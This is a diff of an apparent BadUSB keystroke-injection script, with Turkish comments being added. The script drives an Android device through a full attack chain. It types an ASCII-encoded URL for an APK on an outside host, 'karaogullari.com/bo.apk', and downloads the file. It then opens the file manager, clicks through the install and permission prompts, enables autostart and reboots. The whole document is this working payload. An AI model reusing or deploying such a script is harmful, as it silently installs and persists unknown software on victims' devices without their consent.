@@ -1,4 +1,4 @@
-DELAY 200
+﻿DELAY 200
 ESCAPE
 GUI d
 ALT ESCAPE
@@ -9,17 +9,21 @@ DELAY 700
 CTRL l
 DELAY 300
 
+REM URL yazma (ASCII kodları kullanarak)
 REM "karaogullari.com/bo.apk"
 ASCII 107 97 114 97 111 103 117 108 108 97 114 105 46 99 111 109 47 98 111 46 97 112 107
 DELAY 300
 ENTER
 DELAY 5000
 
+REM İndirme butonuna tıklama
+REM Daha güvenilir bir yöntem kullanmak için bekleme süreleri artırıldı
 TAB
 DELAY 300
 ENTER
 DELAY 10000
 
+REM Dosya yöneticisini açma
 GUI k
 DELAY 700
 STRING downloads
@@ -27,11 +31,13 @@ DELAY 300
 ENTER
 DELAY 700
 
+REM APK dosyasını bulma ve açma (en son dosya)
 TAB
 DELAY 300
 ENTER
 DELAY 300
 
+REM İzinleri verme (gerekirse)
 TAB
 DELAY 300
 ENTER
@@ -41,13 +47,16 @@ DELAY 300
 ENTER
 DELAY 300
 
+REM APK'yı kurma
 TAB
 DELAY 300
 ENTER
 DELAY 10000
 
+REM Kurulumu bitirme
 ENTER
 
+REM Ayarları açma ve otomatik başlatmayı etkinleştirme
 GUI k
 DELAY 700
 STRING settings
@@ -59,6 +68,7 @@ DELAY 300
 ENTER
 DELAY 1000
 STRING MainActivity
+REM Uygulama adınızı burada değiştirin
 DELAY 300
 ENTER
 DELAY 1000
@@ -66,9 +76,10 @@ STRING autostart
 DELAY 300
 ENTER
 DELAY 300
-TOGGLE 1  
+TOGGLE 1  REM Otomatik başlatmayı etkinleştirme
 DELAY 300
 HOME
 DELAY 500
 
+REM Cihazı yeniden başlatma
 REBOOT
